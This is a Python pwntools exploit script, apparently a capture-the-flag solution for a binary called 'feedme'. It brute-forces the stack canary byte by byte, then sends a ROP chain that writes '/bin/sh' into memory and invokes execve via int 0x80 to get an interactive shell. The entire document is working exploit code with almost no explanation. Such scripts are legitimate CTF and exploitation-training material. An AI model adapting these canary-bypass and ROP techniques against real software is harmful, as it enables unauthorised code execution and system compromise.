from pwn import *
proc = process('./feedme')

popEax = 0x080bb496
popEdx = 0x0806f34a
popEdxEcxEbx = 0x0806f370
mov = 0x0809a7ed # mov dword ptr [edx], eax ; ret
syscall = 0x0806328d

def findCanary():
    testCanary = 0x0000
    oldCanary = 0x0000
    byte = 0x01
    for i in range(3):
        for j in range(255):
            proc.send(p32(0x22+i)[:1])
            
            testCanary = oldCanary + byte*16**((i+1)*2)
            payload = b"0"*0x20 + p32(testCanary)[:i+2]
            
            proc.send(payload)
            recieved = proc.recvuntil(b"exit.") #b'!'
            
            if b"YUM" in recieved:    # original code searched for 'smashing'
                print("Found canary: ", hex(testCanary))
                oldCanary = testCanary
                byte = 0x00
                break
            else:
            	byte += 1
    return oldCanary

canary = findCanary()
print(hex(canary))



padding = b"0"*32 + p32(canary) + b"1"*0xc

ROPchain = b""
ROPchain += p32(popEdx)
ROPchain += p32(0x80eafb0) # 0xfffdd010
ROPchain += p32(popEax)
ROPchain += b"/bin"
ROPchain += p32(mov)

ROPchain += p32(popEdx)
ROPchain += p32(0x80eafb0 + 0x4)
ROPchain += p32(popEax)
ROPchain += b"/sh\x00"
ROPchain += p32(mov)

ROPchain += p32(popEax)
ROPchain += p32(0xb)
ROPchain += p32(popEdxEcxEbx)
ROPchain += p32(0x0)
ROPchain += p32(0x0)
ROPchain += p32(0x80eafb0)

ROPchain += p32(0x8049761) # int 0x80 (syscall)

l = len(ROPchain+padding)

print(p32(l)[:1])
proc.send(p32(l)[:1])
proc.send(padding+ROPchain)
proc.interactive()
